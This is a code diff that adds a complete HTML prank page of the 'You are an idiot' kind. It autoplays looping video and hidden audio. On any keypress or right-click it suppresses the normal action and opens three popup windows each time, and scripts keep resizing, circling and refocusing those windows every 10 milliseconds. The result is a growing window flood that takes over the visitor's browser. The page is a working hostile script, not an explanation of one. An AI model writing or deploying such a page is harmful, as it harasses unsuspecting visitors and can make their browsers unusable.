@@ -1,0 +1,62 @@
+<html>
+
+<body>  
+  <video src="/cdn/idiot.mp4" autoplay muted loop id="vi" style="width:500px; height:300px;">
+  <audio autoplay loop hidden>
+	  <source src="/cdn/idiot.mp3" type="audio/mp3">
+	</audio>
+  <script>
+
+function rd(min, max) {
+    return Math.round(Math.random() * (max - min) + min)
+}
+
+     function ct(){
+        let to 
+        let x = 0
+        let y = 0
+        let speed = 12
+        let wh = screen.height - 300
+        let ww = screen.width - 500
+        let ox = rd(1, ww)
+        let oy = rd(1, wh)
+function lerp (start, end, amt){
+  return (1-amt)*start+amt*end;
+}
+let inc = 0
+ let windo = window.open("/cdn/noinput.html", "", "_blank")
+      setInterval(function(){
+        inc+=1
+        if (inc>=9e9) inc=1
+        windo.resizeTo(500, 300)
+        windo.moveTo(lerp(ox, 700*Math.cos(inc/speed), .1),lerp(oy, 700*Math.sin(inc/speed), .1))
+        windo.focus()
+      }, 10)
+     }
+      
+      window.oncontextmenu = function() {
+        for (let i = 0; i < 3; i++){
+          ct()
+        }
+        return false;
+      }
+      
+      window.onkeydown = function(event){
+        for (let i = 0; i < 3; i++){
+          ct()
+        }
+	event.preventDefault()
+      }
+      
+      window.mouseleave = function(event){
+        for (let i = 0; i < 3; i++){
+          ct()
+        }
+      }
+	  
+	
+    </script>
+
+</body>
+
+</html>
